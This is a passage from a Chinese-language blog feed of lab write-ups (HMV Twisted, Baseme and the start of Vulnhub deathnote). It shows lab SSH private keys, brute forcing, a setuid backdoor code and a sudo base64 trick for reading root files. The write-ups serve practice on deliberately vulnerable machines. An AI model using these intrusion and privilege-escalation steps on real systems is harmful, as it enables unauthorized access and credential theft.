class="operator">+</span>VprspxevCM0ibNojtD4rJ1FKPn6cls5gI</span><br><span class="line">mZ3RnFzq3S7sy2egSBlpQ3TJ2cX6dktV8kMigSSHenAwYhq2ALq4X86WksGyUsO1FvRX4<span class="symbol">/</span></span><br><span class="line">hmJTiFsew<span class="operator">+</span><span class="number">7</span>IAKE<span class="operator">+</span>oQHMzpjMGyoiPXfdaI3sa10L2WfkKs4I4K<span class="symbol">/v/x2pW78HIktaQPutro</span></span><br><span class="line">nxD8<span class="operator">/</span>fwGxQnseC69E6vdh<span class="operator">/</span><span class="number">5</span>tS8<span class="operator">+</span>lDEfYDz4oEy9AP26Hdtho0D6E9VT9T<span class="symbol">//2vynHLbmSXK</span></span><br><span class="line">mPbr04h5i9C3h81rh4sAHs9nVAEe3dmZtmZxoZPOJKRhAAAAgFD<span class="operator">+</span>g8BhMCovIBrPZlHCu<span class="operator">+</span></span><br><span class="line">bUlbizp9qfXEc8BYZD3frLbVfwuL6dafDVnj7EqpabmrTLFunQG<span class="operator">+</span><span class="number">9</span><span class="symbol">/PI6bN+iwloDlugtq</span></span><br><span class="line">yzvf924Kkhdk<span class="operator">+</span>N366FLDt06p2tkcmRljm9kKMS3lBPMu9C4<span class="operator">+</span>fgo9LCyphiXrm7UbJHDVSP</span><br><span class="line">UvPg4Fg<span class="symbol">/nqAAAAgQD9Q83ZcqDIx5c51fdYsMUCByLby7OiIfXukMoYPWCE2yRqa53PgXjh</span></span><br><span class="line">V2URHPPhqFEa<span class="operator">+</span>iB138cSgCU3RxbRK7Qm1S7<span class="symbol">/P44fnWCaNu920iLed5z2fzvbTytE/h9QpJ</span></span><br><span class="line">LlecEv2Hx03xyRZBsHFkMf<span class="operator">+</span>dMDC0ueU692Gl7YxRw<span class="operator">+</span>Lic0PQAAAIEA82v3Ytb97SghV7rz</span><br><span class="line">a0S5t7v8pSSYZAW0OJ3DJqaLtEvxhhomduhF71T0iw0wy8rSH7j2M5PGCtCZUa2<span class="symbol">/OqQgKF</span></span><br><span class="line">eERnqQPQSgM0PrATtihXYCTGbWo69NUMcALah0gT5i6nvR1Jr4220InGZEUWHLfvkGTitu</span><br><span class="line">D0POe<span class="operator">+</span>rjV4B7EYkAAAAOYm9uaXRhQHR3aXN0ZWQBAgMEBQ<span class="operator">==</span></span><br><span class="line"><span class="operator">-</span>----END OPENSSH PRIVATE KEY-----</span><br></pre></td></tr></table></figure></div>
<figure class="highlight jboss-cli"><table><tr><td class="code"><pre><span class="line">┌──<span class="params">(root㉿kakeru)</span>-[~<span class="string">/tmp</span>]</span><br><span class="line">└─<span class="comment"># chmod 600 id_rsa</span></span><br><span class="line">                                                                                                                    </span><br><span class="line">┌──<span class="params">(root㉿kakeru)</span>-[~<span class="string">/tmp</span>]</span><br><span class="line">└─<span class="comment"># ssh bonita@192.168.240.249 -p 2222 -i id_rsa</span></span><br></pre></td></tr></table></figure>
<p>成功拿到bonita的shell<br>目录下面有一个程序</p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="APACHE"><figure class="iseeu highlight /apache"><table><tr><td class="code"><pre><span class="line"><span class="attribute">bonita</span>@twisted:~$ file beroot </span><br><span class="line"><span class="attribute">beroot</span>: setuid, setgid ELF <span class="number">64</span>-bit LSB pie executable, x86-<span class="number">64</span>, version <span class="number">1</span> (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-<span class="number">64</span>.so.<span class="number">2</span>, for GNU/Linux <span class="number">3</span>.<span class="number">2</span>.<span class="number">0</span>, BuildID[sha1]=fecfbde059505a54f66d3229cc9ebb78f997a7ba, not stripped</span><br><span class="line"><span class="attribute">bonita</span>@twisted:~$ ./beroot </span><br><span class="line"><span class="attribute">Enter</span> the code:</span><br></pre></td></tr></table></figure></div>
<p>下载到本地用ida查看<br><img src="https://pic1.imgdb.cn/item/679cc6a9d0e0a243d4f8cd31.png"><br>看到code密码是5880<br>然后就可以拿到root的shell</p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="ELIXIR"><figure class="iseeu highlight /elixir"><table><tr><td class="code"><pre><span class="line">bonita<span class="variable">@twisted</span><span class="symbol">:~</span><span class="variable">$ </span>./beroot </span><br><span class="line"><span class="title class_">Enter</span> the <span class="symbol">code:</span></span><br><span class="line"> <span class="number">5880</span></span><br><span class="line">root<span class="variable">@twisted</span><span class="symbol">:~</span><span class="comment"># ls</span></span><br><span class="line">beroot  user.txt</span><br><span class="line">root<span class="variable">@twisted</span><span class="symbol">:~</span><span class="comment"># cdd /root</span></span><br><span class="line"><span class="symbol">bash:</span> <span class="symbol">cdd:</span> command <span class="keyword">not</span> found</span><br><span class="line">root<span class="variable">@twisted</span><span class="symbol">:~</span><span class="comment"># cd /root</span></span><br><span class="line">root<span class="variable">@twisted</span><span class="symbol">:/root</span><span class="comment"># ls</span></span><br><span class="line">root.txt</span><br><span class="line">root<span class="variable">@twisted</span><span class="symbol">:/root</span><span class="comment"># cat root.txt </span></span><br><span class="line"><span class="title class_">HMVwhereismycat</span></span><br></pre></td></tr></table></figure></div>
<p>结束 </p>
<p>总结：难点在于1.怎么从两张图片中获得密码 2.如何从第一个shell拿到id_rsa 3.如何利用beroot这个程序<br>新知识：stegseek图片隐写工具  &#x2F;usr&#x2F;bin&#x2F;getcap 权限查看  ida按tap快捷键看源码</p>
]]></content>
      <categories>
        <category>靶场</category>
        <category>hmv</category>
      </categories>
      <tags>
        <tag>渗透</tag>
        <tag>靶场</tag>
        <tag>HMV</tag>
      </tags>
  </entry>
  <entry>
    <title>HMV-Baseme</title>
    <url>/posts/46022.html</url>
    <content><![CDATA[<p>HMV-Baseme靶场复盘</p>
<span id="more"></span>
<p><img src="https://pic1.imgdb.cn/item/679a35f9d0e0a243d4f878d0.png"></p>
<h1 id="Baseme"><a href="#Baseme" class="headerlink" title="Baseme"></a>Baseme</h1><h2 id="端口扫描"><a href="#端口扫描" class="headerlink" title="端口扫描"></a>端口扫描</h2><p><img src="https://pic1.imgdb.cn/item/679a3980d0e0a243d4f87970.png" alt="|500"><br>开放了22端口和80端口</p>
<h2 id="web探测"><a href="#web探测" class="headerlink" title="web探测"></a>web探测</h2><p>web给了一行base64加密过的文本  得到一个用户名 lucas<br><img src="https://pic1.imgdb.cn/item/679a3983d0e0a243d4f87971.png" alt="|425"><br>提示这个靶机全部用的是base64<br><img src="https://pic1.imgdb.cn/item/679a3985d0e0a243d4f87972.png" alt="|350"><br>还给了一些密码字典  我们存储并且进行base64</p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="BASH"><figure class="iseeu highlight /bash"><table><tr><td class="code"><pre><span class="line">┌──(root㉿kakeru)-[~/base]</span><br><span class="line">└─# <span class="keyword">for</span> i <span class="keyword">in</span> $(<span class="built_in">cat</span> pass);<span class="keyword">do</span> <span class="built_in">echo</span> <span class="variable">$i</span> | <span class="built_in">base64</span> &gt;&gt; pass.txt;<span class="keyword">done</span> </span><br><span class="line">┌──(root㉿kakeru)-[~/base]</span><br><span class="line">└─# <span class="built_in">cat</span> pass.txt     </span><br><span class="line">aWxvdmV5b3UK</span><br><span class="line">eW91bG92ZXlvdQo=</span><br><span class="line">c2hlbG92ZXN5b3UK</span><br><span class="line">aGVsb3Zlc3lvdQo=</span><br><span class="line">d2Vsb3ZleW91Cg==</span><br><span class="line">dGhleWhhdGVzbWUK</span><br></pre></td></tr></table></figure></div>
<p>然后再进行目录爆破<br>用gobuster midium字典爆破之后还是没有发现有用的目录   换dirb&#x2F;common.txt字典<br>还是没有找到任何有用的信息  这里的字典要再用base64进行编码然后爆破  找到了两个目录<br><img src="https://pic1.imgdb.cn/item/679a3989d0e0a243d4f87974.png"><br>curl访问得到一串base64编码  解密之后得到是rsa密钥 </p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="NIX"><figure class="iseeu highlight /nix"><table><tr><td class="code"><pre><span class="line">-----BEGIN OPENSSH PRIVATE KEY-----</span><br><span class="line">b3BlbnNzaC1rZXktdjEAAAAACmFlczI1Ni1jdHIAAAAGYmNyeXB0AAAAGAAAABBTxe8YUL</span><br><span class="line">BtzfftAdPgp8YZAAAAEAAAAAEAAAEXAAAAB3NzaC1yc2EAAAADAQABAAABAQCZCXvEPnO1</span><br><span class="line">cbhxqctBEcBDZjqrFfolwVKmpBgY07M3CK7pO10UgBsLyYwAzJEw4e6YgPNSyCDWFaNTKG</span><br><span class="line"><span class="number">07</span>jgcgrggre8ePCMNFBCAGaYHmLrFIsKDCLI4NE54t58IUHeXCZz72xTobL<span class="symbol">/ptLk26RBnh</span></span><br><span class="line"><span class="number">7</span>bHG1JjGlxOkO6m<span class="operator">+</span><span class="number">1</span>oFNLtNuD2QPl8sbZtEzX4S9nNZ<span class="symbol">/dpyRpMfmB73rN3yyIylevVDEyv</span></span><br><span class="line">f7CZ7oRO46uDgFPy5VzkndCeJF2YtZBXf5gjc2fajMXvq<span class="operator">+</span>b8ol8RZZ6jHXAhiblBXwpAm4</span><br><span class="line">vLYfxzI27BZFnoteBnbdzwSL5apBF5gYWJAHKj<span class="symbol">/J6MhDj1GKAFc1AAAD0N9UDTcUxwMt5X</span></span><br><span class="line">YFIZK8ieBL0NOuwocdgbUuktC21SdnSy6ocW3imM<span class="operator">+</span><span class="number">3</span>mzWjPdoBK<span class="symbol">/Ho339uPmBWI5sbMrpK</span></span><br><span class="line">xkZMnl<span class="operator">+</span>rcTbgz4swv8gNuKhUc7wTgtrNX<span class="operator">+</span>PNMdIALNpsxYLt<span class="symbol">/l56GK8R4J8fLIU5+MojRs</span></span><br><span class="line"><span class="operator">+</span><span class="number">1</span>NrYs8J4rnO1qWNoJRZoDlAaYqBV95cXoAEkwUHVustfgxUtrYKp<span class="operator">+</span>YPFIgx8okMjJgnbi</span><br><span class="line">NNW3TzxluNi5oUhalH2DJ2khKDGQUi9ROFcsEXeJXt3lgpZZt1hrQDA1o8jTXeS4<span class="operator">+</span>dW7nZ</span><br><span class="line">zjf3p0M77b<span class="symbol">/NvcZE+oXYQ1g5Xp1QSOSbj+tlmw54L7Eqb1UhZgnQ7ZsKCoaY9SuAcqm3E0</span></span><br><span class="line">IJh<span class="operator">+</span>I<span class="operator">+</span>Zv1egSMS<span class="symbol">/DOHIxO3psQkciLjkpa+GtwQMl1ZAJHQaB6q70JJcBCfVsykdY52LKDI</span></span><br><span class="line">pxZYpLZmyDx8TTaA8JOmvGpfNZkMU4I0i5<span class="symbol">/ZT65SRFJ1NlBCNwcwtOl9k4PW5LVxNsGRCJ</span></span><br><span class="line">MJr8k5Ac0CX03fXESpmsUUVS<span class="operator">+</span><span class="symbol">/Dj/hntHw89dO8HcqqIUEpeEbfTWLvax0CiSh3KjSceJp</span></span><br><span class="line"><span class="operator">+</span><span class="number">8</span>gUyDGvCkcyVneUQjmmrRswRhTNxxKRBZsekGwHpo8hDYbUEFZqzzLAQbBIAdrl1tt7mV</span><br><span class="line">tVBrmpM6CwJdzYEl21FaK8jvdyCwPr5HUgtuxrSpLvndcnwPaxJWGi4P471DDZeRYDGcWh</span><br><span class="line">i6bICrLQgeJlHaEUmrQC5Rdv03zwI9U8DXUZ<span class="symbol">/OHb40PL8MXqBtU/b6CEU9JuzJpBrKZ+k+</span></span><br><span class="line">tSn7hr8hppT2tUSxDvC<span class="operator">+</span>USMmw<span class="symbol">/WDfakjfHpoNwh7Pt5i0cwwpkXFQxJPvR0bLxvXZn+3xw</span></span><br><span class="line">N7bw45FhBZCsHCAbV2<span class="operator">+</span>hVsP0lyxCQOj7yGkBja87S1e0q6WZjjB4SprenHkO7tg5Q0HsuM</span><br><span class="line">Aif<span class="symbol">/02HHzWG+CR/IGlFsNtq1vylt2x+Y/091vCkROBDawjHz/8ogy2Fzg8JYTeoLkHwDGQ</span></span><br><span class="line">O<span class="operator">+</span>TowA10RATek6ZEIxh6SmtDG<span class="symbol">/V5zeWCuEmK4sRT3q1FSvpB1/H+FxsGCoPIg8FzciGCh2</span></span><br><span class="line">TLuskcXiagns9N1RLOnlHhiZd8RZA0Zg7oZIaBvaZnhZYGycpAJpWKebjrtokLYuMfXRLl</span><br><span class="line"><span class="number">3</span><span class="symbol">/SAeUl72EA3m1DInxsPguFuk00roMc77N6erY7tjOZLVYPoSiygDR1A7f3zYz+0iFI4rL</span></span><br><span class="line">ND8ikgmQvF6hrwwJBrp<span class="symbol">/0xKEaMTCKLvyyZ3eDSdBDPrkThhFwrPpI6+Ex8RvcWI6bTJAWJ</span></span><br><span class="line">LdmmRXUS<span class="operator">/</span>DtO<span class="operator">+</span><span class="number">69</span><span class="operator">/</span>aidvxGAYob<span class="operator">+</span><span class="number">1</span>M<span class="operator">=</span></span><br><span class="line"><span class="operator">-</span>----END OPENSSH PRIVATE KEY-----</span><br></pre></td></tr></table></figure></div>
<p>尝试使用ssh登录<br><img src="https://pic1.imgdb.cn/item/679a3988d0e0a243d4f87973.png"><br>发现不能直接登录 根据提示执行 <code> ssh-keygen -f &#39;/root/.ssh/known_hosts&#39; -R &#39;192.168.240.45&#39;</code><br>然后需要密码  用一开始得到的几个密码的base64编码进行尝试  发现用第一个就能登录<br><img src="https://pic1.imgdb.cn/item/679a3c2cd0e0a243d4f879d4.png"></p>
<h2 id="提权"><a href="#提权" class="headerlink" title="提权"></a>提权</h2><p><code>find / -user root -perm -4000 -print 2&gt;/dev/null</code><br>查找有没有suid提权</p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="CRYSTAL"><figure class="iseeu highlight /crystal"><table><tr><td class="code"><pre><span class="line">lucas<span class="variable">@baseme</span>:~<span class="variable">$ </span>find / -user root -perm -<span class="number">4000</span> -print <span class="number">2</span>&gt;<span class="regexp">/dev/null</span></span><br><span class="line"><span class="regexp">/usr/bin</span><span class="regexp">/sudo</span></span><br><span class="line"><span class="regexp">/usr</span><span class="regexp">/bin/chfn</span></span><br><span class="line"><span class="regexp">/usr/bin</span><span class="regexp">/mount</span></span><br><span class="line"><span class="regexp">/usr</span><span class="regexp">/bin/passwd</span></span><br><span class="line"><span class="regexp">/usr/bin</span><span class="regexp">/newgrp</span></span><br><span class="line"><span class="regexp">/usr</span><span class="regexp">/bin/su</span></span><br><span class="line"><span class="regexp">/usr/bin</span><span class="regexp">/chsh</span></span><br><span class="line"><span class="regexp">/usr</span><span class="regexp">/bin/umount</span></span><br><span class="line"><span class="regexp">/usr/bin</span><span class="regexp">/gpasswd</span></span><br><span class="line"><span class="regexp">/usr</span><span class="regexp">/lib/openssh</span><span class="regexp">/ssh-keysign</span></span><br><span class="line"><span class="regexp">/usr</span><span class="regexp">/lib/dbus</span>-<span class="number">1.0</span>/dbus-daemon-launch-helper</span><br><span class="line"><span class="regexp">/usr/lib</span><span class="regexp">/eject/dmcrypt</span>-get-device</span><br></pre></td></tr></table></figure></div>
<p>没有可以利用的  在查看用户有没有sudo权限<br><img src="https://pic1.imgdb.cn/item/679a3c2bd0e0a243d4f879d3.png"><br>发现可以执行base64<br>提权方式：</p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="BASH"><figure class="iseeu highlight /bash"><table><tr><td class="code"><pre><span class="line">LFILE=file_to_read</span><br><span class="line"><span class="built_in">sudo</span> <span class="built_in">base64</span> <span class="string">&quot;<span class="variable">$LFILE</span>&quot;</span> | <span class="built_in">base64</span> --decode</span><br></pre></td></tr></table></figure></div>
<p>通过这种方式可以直接用root权限查想要的文件  也可以直接查root的ssh的rsa密钥  &#x2F;root&#x2F;.ssh&#x2F;id_rsa</p>
]]></content>
      <categories>
        <category>靶场</category>
        <category>hmv</category>
      </categories>
      <tags>
        <tag>渗透</tag>
        <tag>靶场</tag>
        <tag>HMV</tag>
      </tags>
  </entry>
  <entry>
    <title>Vulnhub-deathnote</title>
    <url>/posts/34304.html</url>
    <content><![CDATA[<p>Vulnhub-deathnote靶机复盘，我最喜欢动漫主题的靶机hhh</p>
<span id="more"></span>
<h1 id="端口扫描"><a href="#端口扫描" class="headerlink" title="端口扫描"></a>端口扫描</h1><div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="NIX"><figure class="iseeu highlight /nix"><table><tr><td class="code"><pre><span class="line">┌──(root㉿kakeru)-[~<span class="operator">/</span>tmp]</span><br><span class="line">└─<span class="comment"># nmap -A 192.168.179.40  </span></span><br><span class="line">Starting Nmap <span class="number">7.95</span> ( https:<span class="symbol">//nmap.org</span> ) at <span class="number">202</span>5-<span class="number">0</span>2-<span class="number">11</span> <span class="number">10</span>:<span class="number">38</span> CST</span><br><span class="line">Nmap scan report for <span class="number">192.168</span>.<span class="number">179.40</span> (<span class="number">192.168</span>.<span class="number">179.40</span>)</span><br><span class="line">Host is up (<span class="number">0.0028</span>s latency).</span><br><span class="line">Not <span class="params">shown:</span> <span class="number">998</span> closed tcp ports (reset)</span><br><span class="line">PORT   STATE SERVICE VERSION</span><br><span class="line"><span class="number">22</span><span class="symbol">/tcp</span> open  ssh     OpenSSH <span class="number">7.9</span>p1 Debian <span class="number">10</span><span class="operator">+</span>deb10u2 (protocol <span class="number">2.0</span>)</span><br><span class="line">| <span class="params">ssh-hostkey:</span> </span><br><span class="line">|   <span class="number">2048</span> <span class="number">5</span>e:b8:ff:<span class="number">2</span>d:ac:c7:e9:<span class="number">3</span>c:<span class="number">99</span>:<span class="number">2</span>f:<span class="number">3</span>b:fc:da:<span class="number">5</span>c:a3:<span class="number">53</span> (RSA)</span><br><span class="line">|   <span class="number">256</span> a8:f3:<span class="number">81</span>:<span class="number">9</span>d:<span class="number">0</span>a:dc:<span class="number">16</span>:<span class="number">9</span>a:<span class="number">49</span>:ee:bc:<span class="number">24</span>:e4:<span class="number">65</span>:<span class="number">5</span>c:a6 (ECDSA)</span><br><span class="line">|_  <span class="number">256</span> <span class="number">4</span>f:<span class="number">20</span>:c3:<span class="number">2</span>d:<span class="number">19</span>:<span class="number">75</span>:<span class="number">5</span>b:e8:<span class="number">1</span>f:<span class="number">32</span>:<span class="number">01</span>:<span class="number">75</span>:c2:<span class="number">70</span>:<span class="number">9</span>a:<span class="number">7</span>e (ED25519)</span><br><span class="line"><span class="number">80</span><span class="symbol">/tcp</span> open  http    Apache httpd <span class="number">2.4</span>.<span class="number">38</span> ((Debian))</span><br><span class="line">|<span class="params">_http-title:</span> Site doesn&#x27;t have a title (text<span class="operator">/</span>html).</span><br><span class="line">|<span class="params">_http-server-header:</span> Apache<span class="symbol">/2.4.38</span> (Debian)</span><br><span class="line">MAC <span class="params">Address:</span> <span class="number">1</span>A:<span class="number">04</span>:<span class="number">7</span>A:CB:<span class="number">01</span>:C4 (Unknown)</span><br><span class="line">Device <span class="params">type:</span> general purpose|router</span><br><span class="line"><span class="params">Running:</span> Linux <span class="number">4</span>.X|<span class="number">5</span>.X, MikroTik RouterOS <span class="number">7</span>.X</span><br><span class="line">OS <span class="params">CPE:</span> cpe:<span class="operator">/</span>o:linux:linux_kernel:<span class="number">4</span> cpe:<span class="operator">/</span>o:linux:linux_kernel:<span class="number">5</span> cpe:<span class="operator">/</span>o:mikrotik:routeros:<span class="number">7</span> cpe:<span class="operator">/</span>o:linux:linux_kernel:<span class="number">5.6</span>.<span class="number">3</span></span><br><span class="line">OS <span class="params">details:</span> Linux <span class="number">4.15</span> <span class="operator">-</span> <span class="number">5.19</span>, OpenWrt <span class="number">21.02</span> (Linux <span class="number">5.4</span>), MikroTik RouterOS <span class="number">7.2</span> <span class="operator">-</span> <span class="number">7.5</span> (Linux <span class="number">5.6</span>.<span class="number">3</span>)</span><br><span class="line">Network <span class="params">Distance:</span> <span class="number">1</span> hop</span><br><span class="line">Service <span class="params">Info:</span> <span class="params">OS:</span> Linux; <span class="params">CPE:</span> cpe:<span class="operator">/</span>o:linux:linux_kernel</span><br><span class="line"></span><br><span class="line">TRACEROUTE</span><br><span class="line">HOP RTT     ADDRESS</span><br><span class="line"><span class="number">1</span>   <span class="number">2.76</span> ms <span class="number">192.168</span>.<span class="number">179.40</span> (<span class="number">192.168</span>.<span class="number">179.40</span>)</span><br><span class="line"></span><br><span class="line">OS and Service detection performed. Please report any incorrect results at https:<span class="operator">//</span>nmap.org<span class="operator">/</span>submit<span class="symbol">/</span> .</span><br></pre></td></tr></table></figure></div>
<h1 id="web探测"><a href="#web探测" class="headerlink" title="web探测"></a>web探测</h1><p>直接访问80端口看看</p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="XML"><figure class="iseeu highlight /xml"><table><tr><td class="code"><pre><span class="line">┌──(root㉿kakeru)-[~/tmp]</span><br><span class="line">└─# curl 192.168.179.40                           </span><br><span class="line"><span class="meta">&lt;!DOCTYPE <span class="keyword">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">html</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">head</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">meta</span> <span class="attr">http-equiv</span>=<span class="string">&quot;refresh&quot;</span> <span class="attr">content</span>=<span class="string">&quot;1; url=&#x27;http://deathnote.vuln/wordpress&quot;</span> /&gt;</span></span><br><span class="line">  <span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line">   <span class="tag">&lt;<span class="name">cente</span>&gt;</span> <span class="tag">&lt;<span class="name">p</span>&gt;</span>Please wait.....<span class="tag">&lt;/<span class="name">p</span>&gt;</span><span class="tag">&lt;/<span class="name">center</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure></div>
<p>而且出现了wordpress 先用目录扫一下</p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="NIX"><figure class="iseeu highlight /nix"><table><tr><td class="code"><pre><span class="line">┌──(root㉿kakeru)-[~<span class="operator">/</span>tmp]</span><br><span class="line">└─<span class="comment"># gobuster dir -u 192.168.179.40 -w /usr/share/seclists/Discovery/Web-Content/raft-medium-files-lowercase.txt -x html,php,jpg,wbpg</span></span><br><span class="line"><span class="operator">==</span><span class="operator">==</span><span class="operator">==</span><span class="operator">==</span><span class="operator">==</span><span class="operator">==</span><span class="operator">==</span><span class="operator">==</span><span class="operator">==</span><span class="operator">==</span><span class="operator">==</span><span class="operator">==</span><span class="operator">==</span><span class="operator">==</span><span class="operator">==</span><span class="operator">==</span><span class="operator">==</span><span class="operator">==</span><span class="operator">==</span><span class="operator">==</span><span class="operator">==</span><span class="operator">==</span><span class="operator">==</span><span class="operator">==</span><span class="operator">==</span><span class="operator">==</span><span class="operator">==</span><span class="operator">==</span><span class="operator">==</span><span class="operator">==</span><span class="operator">==</span><span class="operator">=</span></span><br><span class="line">Gobuster v3.<span class="number">6</span></span><br><span class="line">by OJ Reeves (@TheColonial) &amp; Christian Mehlmauer (@firefart)</span><br><span class="line"><span class="operator">==</span><span class="operator">==</span><span class="operator">==</span><span class="operator">==</span><span class="operator">==</span><span class="operator">==</span><span class="operator">==</span><span class="operator">==</span><span class="operator">==</span><span class="operator">==</span><span class="operator">==</span><span class="operator">==</span><span class="operator">==</span><span class="operator">==</span><span class="operator">==</span><span class="operator">==</span><span class="operator">==</span><span class="operator">==</span><span class="operator">==</span><span class="operator">==</span><span class="operator">==</span><span class="operator">==</span><span class="operator">==</span><span class="operator">==</span><span class="operator">==</span><span class="operator">==</span><span class="operator">==</span><span class="operator">==</span><span class="operator">==</span><span class="operator">==</span><span class="operator">==</span><span class="operator">=</span></span><br><span class="line">[<span class="operator">+</span>] <span class="params">Url:</span>                     http:<span class="symbol">//192.168.179.40</span></span><br><span class="line">[<span class="operator">+</span>] <span class="params">Method:</span>                  GET</span><br><span class="line">[<span class="operator">+</span>] <span class="params">Threads:</span>                 <span class="number">10</span></span><br><span class="line">[<span class="operator">+</span>] <span class="params">Wordlist:</span>                <span class="symbol">/usr/share/seclists/Discovery/Web-Content/raft-medium-files-lowercase.txt</span></span><br><span class="line">[<span class="operator">+</span>] Negative Status <span class="params">codes:</span>   <span class="number">404</span></span><br><span class="line">[<span class="operator">+</span>] User <span class="params">Agent:</span>              gobuster<span class="symbol">/3.6</span></span><br><span class="line">[<span class="operator">+</span>] <span class="params">Extensions:</span>              html,php,jpg,wbpg</span><br><span class="line">[<span class="operator">+</span>] <span class="params">Timeout:</span>                 <span class="number">10</span>s</span><br><span class="line"><span class="operator">==</span><span class="operator">==</span><span class="operator">==</span><span class="operator">==</span><span class="operator">==</span><span class="operator">==</span><span class="operator">==</span><span class="operator">==</span><span class="operator">==</span><span class="operator">==</span><span class="operator">==</span><span class="operator">==</span><span class="operator">==</span><span class="operator">==</span><span class="operator">==</span><span class="operator">==</span><span class="operator">==</span><span class="operator">==</span><span class="operator">==</span><span class="operator">==</span><span class="operator">==</span><span class="operator">==</span><span class="operator">==</span><span class="operator">==</span><span class="operator">==</span><span class="operator">==</span><span class="operator">==</span><span class="operator">==</span><span class="operator">==</span><span class="operator">==</span><span class="operator">==</span><span class="operator">=</span></span><br><span class="line">Starting gobuster <span class="keyword">in</span> directory enumeration mode</span><br><span class="line"><span class="operator">==</span><span class="operator">==</span><span class="operator">==</span><span class="operator">==</span><span class="operator">==</span><span class="operator">==</span><span class="operator">==</span><span class="operator">==</span><span class="operator">==</span><span class="operator">==</span><span class="operator">==</span><span class="operator">==</span><span class="operator">==</span><span class="operator">==</span><span class="operator">==</span><span class="operator">==</span><span class="operator">==</span><span class="operator">==</span><span class="operator">==</span><span class="operator">==</span><span class="operator">==</span><span class="operator">==</span><span class="operator">==</span><span class="operator">==</span><span class="operator">==</span><span class="operator">==</span><span class="operator">==</span><span class="operator">==</span><span class="operator">==</span><span class="operator">==</span><span class="operator">==</span><span class="operator">=</span></span><br><span class="line"><span class="symbol">/index.html</span>           (<span class="params">Status:</span> <span class="number">200</span>) [<span class="params">Size:</span> <span class="number">197</span>]</span><br><span class="line"><span class="symbol">/.htaccess</span>            (<span class="params">Status:</span> <span class="number">403</span>) [<span class="params">Size:</span> <span class="number">279</span>]</span><br><span class="line"><span class="symbol">/.htaccess.html</span>       (<span class="params">Status:</span> <span class="number">403</span>) [<span class="params">Size:</span> <span class="number">279</span>]</span><br><span class="line"><span class="symbol">/.htaccess.jpg</span>        (<span class="params">Status:</span> <span class="number">403</span>) [<span class="params">Size:</span> <span class="number">279</span>]</span><br><span class="line"><span class="symbol">/.htaccess.wbpg</span>       (<span class="params">Status:</span> <span class="number">403</span>) [<span class="params">Size:</span> <span class="number">279</span>]</span><br><span class="line"><span class="symbol">/.htaccess.php</span>        (<span class="params">Status:</span> <span class="number">403</span>) [<span class="params">Size:</span> <span class="number">279</span>]</span><br><span class="line"><span class="symbol">/robots.txt</span>           (<span class="params">Status:</span> <span class="number">200</span>) [<span class="params">Size:</span> <span class="number">68</span>]</span><br><span class="line"><span class="symbol">/.</span>                    (<span class="params">Status:</span> <span class="number">200</span>) [<span class="params">Size:</span> <span class="number">197</span>]</span><br><span class="line"><span class="symbol">/.html</span>                (<span class="params">Status:</span> <span class="number">403</span>) [<span class="params">Size:</span> <span class="number">279</span>]</span><br><span class="line"><span class="symbol">/.html.html</span>           (<span class="params">Status:</span> <span class="number">403</span>) [<span class="params">Size:</span> <span class="number">279</span>]</span><br><span class="line"><span class="symbol">/.html.php</span>            (<span class="params">Status:</span> <span class="number">403</span>) [<span class="params">Size:</span> <span class="number">279</span>]</span><br><span class="line"><span class="symbol">/.html.jpg</span>            (<span class="params">Status:</span> <span class="number">403</span>) [<span class="params">Size:</span> <span class="number">279</span>]</span><br><span class="line"><span class="symbol">/.html.wbpg</span>           (<span class="params">Status:</span> <span class="number">403</span>) [<span class="params">Size:</span> <span class="number">279</span>]</span><br><span class="line"><span class="symbol">/.php</span>                 (<span class="params">Status:</span> <span class="number">403</span>) [<span class="params">Size:</span> <span class="number">279</span>]</span><br><span class="line"><span class="symbol">/.htpasswd</span>            (<span class="params">Status:</span> <span class="number">403</span>) [<span class="params">Size:</span> <span class="number">279</span>]</span><br><span class="line"><span class="symbol">/.htpasswd.jpg</span>        (<span class="params">Status:</span> <span class="number">403</span>) [<span class="params">Size:</span> <span class="number">279</span>]</span><br><span class="line"><span class="symbol">/.htpasswd.wbpg</span>       (<span class="params">Status:</span> <span class="number">403</span>) [<span class="params">Size:</span> <span class="number">279</span>]</span><br><span class="line"><span class="symbol">/.htpasswd.html</span>       (<span class="params">Status:</span> <span class="number">403</span>) [<span class="params">Size:</span> <span class="number">279</span>]</span><br><span class="line"><span class="symbol">/.htpasswd.php</span>        (<span class="params">Status:</span> <span class="number">403</span>) [<span class="params">Size:</span> <span class="number">279</span>]</span><br><span class="line"><span class="symbol">/.htm</span>                 (<span class="params">Status:</span> <span class="number">403</span>) [<span class="params">Size:</span> <span class="number">279</span>]</span><br><span class="line"><span class="symbol">/.htm.html</span>            (<span class="params">Status:</span> <span class="number">403</span>) [<span class="params">Size:</span> <span class="number">279</span>]</span><br><span class="line"><span class="symbol">/.htm.wbpg</span>            (<span class="params">Status:</span> <span class="number">403</span>) [<span class="params">Size:</span> <span class="number">279</span>]</span><br><span class="line"><span class="symbol">/.htm.jpg</span>             (<span class="params">Status:</span> <span class="number">403</span>) [<span class="params">Size:</span> <span 